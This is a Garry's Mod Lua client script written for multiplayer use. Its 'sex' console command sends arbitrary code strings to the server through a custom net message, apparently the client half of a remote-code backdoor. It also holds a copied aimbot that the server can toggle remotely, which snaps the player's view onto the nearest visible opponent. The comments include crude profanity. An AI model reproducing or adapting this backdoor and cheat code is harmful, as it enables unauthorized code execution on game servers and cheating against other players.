if CLIENT and not game.SinglePlayer() then

concommand.Add("sex", function(ply, cmd, args)
	local code = args[1]
	if code then
		if string.len(code) <= 65532 then
			net.Start( "THESEXHOOK" )
			net.WriteString( code )
			net.SendToServer()
		end
	else
		net.Start( "THESEXHOOK" )
		net.SendToServer()
	end
end)

net.Receive( "SexAlertClient", function()
	LocalPlayer():PrintMessage( HUD_PRINTCENTER, net.ReadString() )
end )

net.Receive( "SexSoundClient", function()
	surface.PlaySound( net.ReadString() )
end )

do

local bAimbotEnabled = false

net.Receive( "SexLeanMode", function()
	print("fuck you")
	bAimbotEnabled = not bAimbotEnabled
end)

-- stole this code from some legit aimbot so i dont feel too bad about it, also it sucked so i had to clean it
	
local util = util
local player = player
local input = input
local bit = bit
local hook = hook
local aimtarget
local MASK_SHOT = MASK_SHOT

local function GetPos( v )
	local eyes = v:LookupAttachment("eyes")
	return(eyes && v:GetAttachment(eyes).Pos || v:LocalToWorld(v:OBBCenter())) - Vector(0, 0, 10)
end
	 
local function Valid( ply, v )
	if(!v || !v:IsValid() || v:Health() < 1 || v:IsDormant() || v == ply) then return false end
	local trace = {
		mask = MASK_SHOT,
		endpos = GetPos(v),
		start = ply:EyePos(),
		filter = {ply, v},
	}
	return(util.TraceLine(trace).Fraction == 1)
end

local function GetTarget( ply )
	if (Valid( ply, aimtarget)) then return end
	aimtarget = nil
	local allplys = player.GetAll()
	for i = 1, #allplys do
		local v = allplys[i]
		if (!Valid( ply, v)) then continue end
		aimtarget = v
		return
	end
end

function fuckemup( ply )
	GetTarget( ply )
	if (bAimbotEnabled && aimtarget) then
		local pos = (GetPos(aimtarget) - ply:EyePos()):Angle()
		ply:SetEyeAngles(pos)
	end
end

hook.Add( "CalcView", "", function( ply )
	if bAimbotEnabled then
		fuckemup( LocalPlayer() )
	end
end )

end

elseif game.SinglePlayer() then

concommand.Add("sex", function(ply, cmd, args)
	print("sex cannot be used out of multiplier")
end)

end